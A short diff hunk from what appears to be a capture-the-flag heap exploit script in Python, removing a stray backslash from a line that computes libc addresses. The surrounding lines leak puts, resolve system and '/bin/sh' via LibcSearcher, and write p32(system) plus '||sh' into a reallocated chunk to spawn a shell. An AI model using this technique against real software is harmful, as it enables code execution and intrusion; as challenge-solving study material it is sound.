@@ -29,7 +29,7 @@ print(hex(puts))
 libc = LibcSearcher('puts', puts)
 base = puts - libc.dump('puts')
 sys = base + libc.dump('system')
-binsh = base + libc.dump('str_bin_sh')\
+binsh = base + libc.dump('str_bin_sh')
 delete(2)
 add(0x8, p32(sys) + b'||sh')
 print(0)
